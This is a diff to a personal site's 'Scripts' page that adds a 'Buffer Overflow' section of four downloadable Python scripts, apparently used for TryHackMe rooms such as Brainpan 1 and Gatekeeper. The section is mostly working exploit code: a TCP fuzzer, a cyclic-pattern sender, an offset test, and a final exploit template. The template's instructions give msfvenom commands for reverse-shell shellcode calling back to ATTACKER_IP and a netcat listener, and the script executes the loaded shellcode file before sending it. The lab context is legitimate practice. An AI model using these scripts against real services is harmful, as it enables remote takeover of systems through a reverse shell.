@@ -68,6 +68,7 @@
 <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
 <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600&display=swap" rel="stylesheet">
 <link rel="stylesheet" href="/assets/css/extended/harmonize.css">
+<link rel="stylesheet" href="/assets/css/accents.css">
 <meta property="og:url" content="https://jennshaggy.github.io/scripts/">
 <meta property="og:site_name" content="Jenn Shagrin">
 <meta property="og:title" content="Scripts">
@@ -345,6 +346,181 @@ Dependencies:
             <span class="k">break</span>  <span class="c1"># actual wrong password, try next</span>
 
 <span class="n">chrome</span><span class="o">.</span><span class="n">quit</span><span class="p">()</span></code></pre></div>
+
+<hr>
+
+<h2>Buffer Overflow</h2>
+
+<p>Four-stage toolkit for exploiting stack-based buffer overflows over TCP. Run in sequence: fuzz to find the crash point, send a cyclic pattern to locate EIP, confirm the offset, then fire the shellcode.</p>
+
+<h3>bof_fuzz.py</h3>
+
+<p>Finds the crash threshold of a TCP service by sending payloads of increasing size. Stops and reports the byte count at the point of disconnection or crash. Configure HOST, PORT, START, STEP, and MAX at the top before running.</p>
+
+<p>Used in: Brainstorm, Brainpan 1, Gatekeeper. Download: <a href="/scripts/bof_fuzz.py">bof_fuzz.py</a></p>
+
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="ch">#!/usr/bin/env python3</span>
+<span class="sd">&quot;&quot;&quot;</span>
+<span class="sd">bof_fuzz.py — Generic buffer overflow fuzzer.</span>
+<span class="sd">Sends increasing payloads over TCP to find the crash threshold.</span>
+
+<span class="sd">Configure HOST, PORT, START, STEP, and MAX before running.</span>
+
+<span class="sd">Used in: Brainstorm, Brainpan 1, Gatekeeper (TryHackMe)</span>
+<span class="sd">&quot;&quot;&quot;</span>
+<span class="kn">import</span><span class="w"> </span><span class="nn">socket</span>
+<span class="kn">import</span><span class="w"> </span><span class="nn">time</span>
+
+<span class="n">HOST</span> <span class="o">=</span> <span class="s2">&quot;TARGET_IP&quot;</span>
+<span class="n">PORT</span> <span class="o">=</span> <span class="mi">9999</span>
+<span class="n">START</span> <span class="o">=</span> <span class="mi">100</span>
+<span class="n">STEP</span> <span class="o">=</span> <span class="mi">100</span>
+<span class="n">MAX</span> <span class="o">=</span> <span class="mi">3000</span>
+<span class="n">TIMEOUT</span> <span class="o">=</span> <span class="mi">5</span>
+
+<span class="k">for</span> <span class="n">size</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="n">START</span><span class="p">,</span> <span class="n">MAX</span><span class="p">,</span> <span class="n">STEP</span><span class="p">):</span>
+    <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;[*] Sending </span><span class="si">{</span><span class="n">size</span><span class="si">}</span><span class="s2"> bytes&quot;</span><span class="p">)</span>
+    <span class="k">try</span><span class="p">:</span>
+        <span class="n">s</span> <span class="o">=</span> <span class="n">socket</span><span class="o">.</span><span class="n">socket</span><span class="p">(</span><span class="n">socket</span><span class="o">.</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">socket</span><span class="o">.</span><span class="n">SOCK_STREAM</span><span class="p">)</span>
+        <span class="n">s</span><span class="o">.</span><span class="n">settimeout</span><span class="p">(</span><span class="n">TIMEOUT</span><span class="p">)</span>
+        <span class="n">s</span><span class="o">.</span><span class="n">connect</span><span class="p">((</span><span class="n">HOST</span><span class="p">,</span> <span class="n">PORT</span><span class="p">))</span>
+        <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1024</span><span class="p">)</span>
+        <span class="n">s</span><span class="o">.</span><span class="n">sendall</span><span class="p">(</span><span class="sa">b</span><span class="s2">&quot;A&quot;</span> <span class="o">*</span> <span class="n">size</span> <span class="o">+</span> <span class="sa">b</span><span class="s2">&quot;</span><span class="se">\r\n</span><span class="s2">&quot;</span><span class="p">)</span>
+        <span class="n">s</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
+        <span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+    <span class="k">except</span> <span class="ne">Exception</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
+        <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;[!] Crashed or disconnected around </span><span class="si">{</span><span class="n">size</span><span class="si">}</span><span class="s2"> bytes: </span><span class="si">{</span><span class="n">e</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>
+        <span class="k">break</span>
+</code></pre></div>
+
+<h3>bof_pattern.py</h3>
+
+<p>Sends a cyclic pattern generated by Metasploit's pattern_create.rb to a TCP service. The unique sequence lets the EIP value after a crash pinpoint the exact offset. Requires a debugger attached to the target process to read EIP.</p>
+
+<p>Used in: Brainstorm, Brainpan 1, Gatekeeper. Download: <a href="/scripts/bof_pattern.py">bof_pattern.py</a></p>
+
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="ch">#!/usr/bin/env python3</span>
+<span class="sd">&quot;&quot;&quot;</span>
+<span class="sd">bof_pattern.py — Cyclic pattern sender for EIP offset identification.</span>
+
+<span class="sd">Generate the pattern first:</span>
+<span class="sd">  /usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l LENGTH &gt; pattern.txt</span>
+
+<span class="sd">Attach a debugger to the target process before running. Read the EIP value</span>
+<span class="sd">from the crash, then calculate offset with:</span>
+<span class="sd">  /usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q EIP_VALUE</span>
+
+<span class="sd">Used in: Brainstorm, Brainpan 1, Gatekeeper (TryHackMe)</span>
+<span class="sd">&quot;&quot;&quot;</span>
+<span class="kn">import</span><span class="w"> </span><span class="nn">socket</span>
+
+<span class="n">HOST</span> <span class="o">=</span> <span class="s2">&quot;TARGET_IP&quot;</span>
+<span class="n">PORT</span> <span class="o">=</span> <span class="mi">9999</span>
+<span class="n">PATTERN_FILE</span> <span class="o">=</span> <span class="s2">&quot;pattern.txt&quot;</span>
+
+<span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="n">PATTERN_FILE</span><span class="p">,</span> <span class="s2">&quot;rb&quot;</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
+    <span class="n">payload</span> <span class="o">=</span> <span class="n">f</span><span class="o">.</span><span class="n">read</span><span class="p">()</span><span class="o">.</span><span class="n">strip</span><span class="p">()</span>
+
+<span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;[*] Sending </span><span class="si">{</span><span class="nb">len</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span><span class="si">}</span><span class="s2">-byte cyclic pattern to </span><span class="si">{</span><span class="n">HOST</span><span class="si">}</span><span class="s2">:</span><span class="si">{</span><span class="n">PORT</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>
+<span class="n">s</span> <span class="o">=</span> <span class="n">socket</span><span class="o">.</span><span class="n">socket</span><span class="p">(</span><span class="n">socket</span><span class="o">.</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">socket</span><span class="o">.</span><span class="n">SOCK_STREAM</span><span class="p">)</span>
+<span class="n">s</span><span class="o">.</span><span class="n">connect</span><span class="p">((</span><span class="n">HOST</span><span class="p">,</span> <span class="n">PORT</span><span class="p">))</span>
+<span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1024</span><span class="p">)</span>
+<span class="n">s</span><span class="o">.</span><span class="n">sendall</span><span class="p">(</span><span class="n">payload</span> <span class="o">+</span> <span class="sa">b</span><span class="s2">&quot;</span><span class="se">\r\n</span><span class="s2">&quot;</span><span class="p">)</span>
+<span class="n">s</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
+<span class="nb">print</span><span class="p">(</span><span class="s2">&quot;[*] Pattern sent. Check debugger for EIP value.&quot;</span><span class="p">)</span>
+</code></pre></div>
+
+<h3>bof_control_test.py</h3>
+
+<p>Verifies the offset before adding shellcode. Sends A * OFFSET + B * 4 + C * 100. If the offset is correct, EIP will equal 0x42424242 (BBBB) in the debugger. Set OFFSET to your calculated value before running.</p>
+
+<p>Used in: Brainstorm, Brainpan 1, Gatekeeper. Download: <a href="/scripts/bof_control_test.py">bof_control_test.py</a></p>
+
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="ch">#!/usr/bin/env python3</span>
+<span class="sd">&quot;&quot;&quot;</span>
+<span class="sd">bof_control_test.py — Offset control test.</span>
+
+<span class="sd">Sends A * OFFSET + B * 4 + C * 100.</span>
+<span class="sd">If the offset is correct, EIP should equal 0x42424242 (BBBB) in the debugger.</span>
+<span class="sd">C&#39;s appear on the stack after EIP, confirming space for shellcode.</span>
+
+<span class="sd">Set OFFSET to your calculated value before running.</span>
+
+<span class="sd">Used in: Brainstorm, Brainpan 1, Gatekeeper (TryHackMe)</span>
+<span class="sd">&quot;&quot;&quot;</span>
+<span class="kn">import</span><span class="w"> </span><span class="nn">socket</span>
+
+<span class="n">HOST</span> <span class="o">=</span> <span class="s2">&quot;TARGET_IP&quot;</span>
+<span class="n">PORT</span> <span class="o">=</span> <span class="mi">9999</span>
+<span class="n">OFFSET</span> <span class="o">=</span> <span class="mi">0</span>  <span class="c1"># Set this to your calculated offset</span>
+
+<span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="s2">&quot;A&quot;</span> <span class="o">*</span> <span class="n">OFFSET</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">&quot;B&quot;</span> <span class="o">*</span> <span class="mi">4</span>      <span class="c1"># Should land in EIP (0x42424242)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">&quot;C&quot;</span> <span class="o">*</span> <span class="mi">100</span>    <span class="c1"># Should appear after EIP on the stack</span>
+
+<span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;[*] Sending </span><span class="si">{</span><span class="nb">len</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span><span class="si">}</span><span class="s2">-byte control payload to </span><span class="si">{</span><span class="n">HOST</span><span class="si">}</span><span class="s2">:</span><span class="si">{</span><span class="n">PORT</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>
+<span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;[*] Layout: A*</span><span class="si">{</span><span class="n">OFFSET</span><span class="si">}</span><span class="s2"> + BBBB + C*100&quot;</span><span class="p">)</span>
+<span class="n">s</span> <span class="o">=</span> <span class="n">socket</span><span class="o">.</span><span class="n">socket</span><span class="p">(</span><span class="n">socket</span><span class="o">.</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">socket</span><span class="o">.</span><span class="n">SOCK_STREAM</span><span class="p">)</span>
+<span class="n">s</span><span class="o">.</span><span class="n">connect</span><span class="p">((</span><span class="n">HOST</span><span class="p">,</span> <span class="n">PORT</span><span class="p">))</span>
+<span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1024</span><span class="p">)</span>
+<span class="n">s</span><span class="o">.</span><span class="n">sendall</span><span class="p">(</span><span class="n">payload</span> <span class="o">+</span> <span class="sa">b</span><span class="s2">&quot;</span><span class="se">\r\n</span><span class="s2">&quot;</span><span class="p">)</span>
+<span class="n">s</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
+<span class="nb">print</span><span class="p">(</span><span class="s2">&quot;[*] Sent. Verify EIP = 42424242 in debugger.&quot;</span><span class="p">)</span>
+</code></pre></div>
+
+<h3>bof_exploit.py</h3>
+
+<p>Final exploit template. Set HOST, PORT, OFFSET, and JMP_ESP (little-endian), generate shellcode with msfvenom into shellcode.txt, then run. Syntax check with <code>python3 -m py_compile</code> before firing. Start a listener before running the script.</p>
+
+<p>Used in: Brainstorm, Brainpan 1, Gatekeeper. Download: <a href="/scripts/bof_exploit.py">bof_exploit.py</a></p>
+
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="ch">#!/usr/bin/env python3</span>
+<span class="sd">&quot;&quot;&quot;</span>
+<span class="sd">bof_exploit.py — Buffer overflow exploit template.</span>
+
+<span class="sd">Before running:</span>
+<span class="sd">1. Set OFFSET, JMP_ESP, HOST, and PORT.</span>
+<span class="sd">2. Generate shellcode with msfvenom and save to shellcode.txt:</span>
+
+<span class="sd">   Windows target:</span>
+<span class="sd">   msfvenom -p windows/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4444 EXITFUNC=thread -b &#39;\x00&#39; -f python -v shellcode &gt; shellcode.txt</span>
+
+<span class="sd">   Linux target:</span>
+<span class="sd">   msfvenom -p linux/x86/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4444 -b &#39;\x00&#39; -f python -v shellcode &gt; shellcode.txt</span>
+
+<span class="sd">3. Syntax check before firing:</span>
+<span class="sd">   python3 -m py_compile bof_exploit.py</span>
+
+<span class="sd">4. Start a listener:</span>
+<span class="sd">   nc -lvnp 4444</span>
+
+<span class="sd">Used in: Brainstorm, Brainpan 1, Gatekeeper (TryHackMe)</span>
+<span class="sd">&quot;&quot;&quot;</span>
+<span class="kn">import</span><span class="w"> </span><span class="nn">socket</span>
+
+<span class="n">HOST</span> <span class="o">=</span> <span class="s2">&quot;TARGET_IP&quot;</span>
+<span class="n">PORT</span> <span class="o">=</span> <span class="mi">9999</span>
+<span class="n">OFFSET</span> <span class="o">=</span> <span class="mi">0</span>                      <span class="c1"># Set to your confirmed offset</span>
+<span class="n">JMP_ESP</span> <span class="o">=</span> <span class="sa">b</span><span class="s2">&quot;</span><span class="se">\x00\x00\x00\x00</span><span class="s2">&quot;</span>  <span class="c1"># Replace with JMP ESP address (little-endian)</span>
+<span class="n">NOPS</span> <span class="o">=</span> <span class="sa">b</span><span class="s2">&quot;</span><span class="se">\x90</span><span class="s2">&quot;</span> <span class="o">*</span> <span class="mi">32</span>
+<span class="n">SHELLCODE_FILE</span> <span class="o">=</span> <span class="s2">&quot;shellcode.txt&quot;</span>
+
+<span class="n">exec</span><span class="p">(</span><span class="nb">open</span><span class="p">(</span><span class="n">SHELLCODE_FILE</span><span class="p">,</span> <span class="s2">&quot;r&quot;</span><span class="p">)</span><span class="o">.</span><span class="n">read</span><span class="p">()</span><span class="p">)</span>
+
+<span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="s2">&quot;A&quot;</span> <span class="o">*</span> <span class="n">OFFSET</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">JMP_ESP</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">NOPS</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">shellcode</span>
+
+<span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;[*] Target: </span><span class="si">{</span><span class="n">HOST</span><span class="si">}</span><span class="s2">:</span><span class="si">{</span><span class="n">PORT</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>
+<span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;[*] Payload length: </span><span class="si">{</span><span class="nb">len</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span><span class="si">}</span><span class="s2"> bytes&quot;</span><span class="p">)</span>
+<span class="n">s</span> <span class="o">=</span> <span class="n">socket</span><span class="o">.</span><span class="n">socket</span><span class="p">(</span><span class="n">socket</span><span class="o">.</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">socket</span><span class="o">.</span><span class="n">SOCK_STREAM</span><span class="p">)</span>
+<span class="n">s</span><span class="o">.</span><span class="n">connect</span><span class="p">((</span><span class="n">HOST</span><span class="p">,</span> <span class="n">PORT</span><span class="p">))</span>
+<span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1024</span><span class="p">)</span>
+<span class="n">s</span><span class="o">.</span><span class="n">sendall</span><span class="p">(</span><span class="n">payload</span> <span class="o">+</span> <span class="sa">b</span><span class="s2">&quot;</span><span class="se">\r\n</span><span class="s2">&quot;</span><span class="p">)</span>
+<span class="n">s</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
+<span class="nb">print</span><span class="p">(</span><span class="s2">&quot;[*] Payload sent.&quot;</span><span class="p">)</span>
+</code></pre></div>
 
   </div>
 
